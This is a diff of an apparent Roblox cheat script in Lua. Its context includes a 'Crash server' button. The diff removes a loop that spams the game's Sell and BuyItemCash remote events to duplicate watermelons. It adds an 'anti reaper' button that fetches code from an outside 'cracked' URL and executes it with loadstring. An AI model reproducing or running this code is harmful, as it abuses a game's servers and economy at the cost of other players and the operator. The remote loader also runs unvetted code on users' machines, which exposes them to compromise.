@@ -991,34 +991,10 @@ Section:NewButton("Crash server", "Crash server", function()
     game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
 end)
 local Tab     = Window:NewTab("anti reaper")
-                local Section = Tab:NewSection("WILL buy inf melon")
-
-                                                        Section:NewToggle("buy Watermelon"  , "Dupe Watermelon", function(state)
-                                                            if state then
-                                                                _G.on = true
-                                                                
-                                                                while _G.on == true do
-                                                                    wait()
-                                                                
-                                                                wait(0.2)
-                                                                local args = {
-                                                                        [1] = "Watermelon"
-                                                                    }
-                                                                    game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(unpack(args))
-                                                                        local args = {
-                                                                        [1] = "Watermelon"
-                                                                    }
-                                                                    game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
-                                                                
-                                                                wait(0.2)
-                                                                
-                                                                    end
-                                                                    else
-                                                                _G.on = false
-                                                                        
-                                                                    end
-                                                                end)
-
+                local Section = Tab:NewSection("find the auto on the gui melon")
+Section:NewButton("anti reaper"  , "anti reaper", function()
+loadstring(game:HttpGet(("https://thekillerhood.xyz/cracked/CRACKEDBYKILLERHOOD"),true))()
+end)                                                     
 -- Gui to Lua
 -- Version: 3.2
 
